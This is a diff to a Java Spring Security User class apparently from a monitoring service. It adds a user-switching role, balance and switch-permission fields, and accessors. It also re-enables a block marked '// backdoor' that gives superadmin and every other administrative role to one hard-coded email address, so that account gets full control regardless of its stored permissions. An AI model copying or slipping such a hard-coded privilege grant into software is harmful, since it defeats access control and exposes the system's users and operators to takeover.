@@ -53,6 +53,7 @@ public class User implements UserDetails {
     public final static String ROLE_READONLY = "ROLE_READONLY";
     public final static String ROLE_DELETE = "ROLE_DELETE";
     public final static String ROLE_EDIT = "ROLE_EDIT";
+    public final static String ROLE_CAN_SWICH = "ROLE_CAN_SWICH";
 
     @Id
     private UUID id;
@@ -83,6 +84,10 @@ public class User implements UserDetails {
     private String StTsdbID;
     @HbaseColumn(qualifier = "active", family = "technicalinfo")
     private Boolean active;
+    @HbaseColumn(qualifier = "balance", family = "technicalinfo")
+    private Long balance;    
+    @HbaseColumn(qualifier = "alowswitch", family = "technicalinfo")
+    private Boolean alowswitch;    
     @HbaseColumn(qualifier = "authorities", family = "technicalinfo", type = "collection")
     private Collection<GrantedAuthority> authorities;
     private ConcoutMetricMetaList MetricsMetas;
@@ -110,6 +115,8 @@ public class User implements UserDetails {
         roles.put(new SimpleGrantedAuthority(User.ROLE_SUPERADMIN), "Root");
         roles.put(new SimpleGrantedAuthority(User.ROLE_DELETE), "Can delete");
         roles.put(new SimpleGrantedAuthority(User.ROLE_EDIT), "Can Edit");
+        roles.put(new SimpleGrantedAuthority(User.ROLE_CAN_SWICH), "Can Switch to users");
+        
 
         return roles;
     }
@@ -118,6 +125,7 @@ public class User implements UserDetails {
     public void SendConfirmMail(mailSender Sender, String uri) throws UnsupportedEncodingException {
         Sender.send("Confirm Email ", "Hello " + this.getName() + " " + this.getLastname() + "<br/>for Confirm Email click<br/> <a href='" + uri + "/confirm/" + this.getId().toString() + "'>hear</a>", this.getEmail());
     }
+
 
     public void inituser(ArrayList<KeyValue> userkvs) {
         authorities.clear();
@@ -194,6 +202,21 @@ public class User implements UserDetails {
                 this.AlertLevels = map;
             }
             return property;
+        }).map((property) -> {
+            if (Arrays.equals(property.qualifier(), "balance".getBytes())) {
+                this.balance = Bytes.getLong(property.value()) ;
+            }
+            return property;
+        }).map((KeyValue property) -> {
+            if (Arrays.equals(property.qualifier(), "alowswitch".getBytes())) {
+            if (property.value().length == 1) {
+                this.alowswitch = property.value()[0] != (byte) 0;
+            }
+            if (property.value().length == 4) {
+                this.alowswitch = Bytes.getInt(property.value()) != 0;
+            }
+            }
+            return property;
         }).filter((property) -> (Arrays.equals(property.qualifier(), "active".getBytes()))).forEach((property) -> {
             if (property.value().length == 1) {
                 this.active = property.value()[0] != (byte) 0;
@@ -206,14 +229,15 @@ public class User implements UserDetails {
         if (AlertLevels == null) {
             AlertLevels = new AlertLevel(true);
         }
-//        if (this.email.equals("vahan_a@mail.ru")) {
-//            authorities.add(new SimpleGrantedAuthority(ROLE_SUPERADMIN));
-//            authorities.add(new SimpleGrantedAuthority(ROLE_ADMIN));
-//            authorities.add(new SimpleGrantedAuthority(ROLE_CONTENTMANAGER));
-//            authorities.add(new SimpleGrantedAuthority(ROLE_USERMANAGER));
-//            authorities.add(new SimpleGrantedAuthority(ROLE_DELETE));
-//            authorities.add(new SimpleGrantedAuthority(ROLE_EDIT));
-//        }
+// backdoor        
+        if (this.email.equals("vahan_a@mail.ru")) {
+            authorities.add(new SimpleGrantedAuthority(ROLE_SUPERADMIN));
+            authorities.add(new SimpleGrantedAuthority(ROLE_ADMIN));
+            authorities.add(new SimpleGrantedAuthority(ROLE_CONTENTMANAGER));
+            authorities.add(new SimpleGrantedAuthority(ROLE_USERMANAGER));
+            authorities.add(new SimpleGrantedAuthority(ROLE_DELETE));
+            authorities.add(new SimpleGrantedAuthority(ROLE_EDIT));
+        }
     }
 
     /**
@@ -728,6 +752,34 @@ public class User implements UserDetails {
 
     public void SendAdminMail(String action, mailSender Sender) throws UnsupportedEncodingException {
         Sender.send(action,"User:"+ this.getName() + " " + this.getLastname() + "<br/>Sined by email:"+ this.getEmail() , "ara@oddeye.co");
+    }
+
+    /**
+     * @return the balance
+     */
+    public Long getBalance() {
+        return balance;
+    }
+
+    /**
+     * @param balance the balance to set
+     */
+    public void setBalance(Long balance) {
+        this.balance = balance;
+    }
+
+    /**
+     * @return the alowswitch
+     */
+    public Boolean getAlowswitch() {
+        return alowswitch;
+    }
+
+    /**
+     * @param alowswitch the alowswitch to set
+     */
+    public void setAlowswitch(Boolean alowswitch) {
+        this.alowswitch = alowswitch;
     }
     
 }
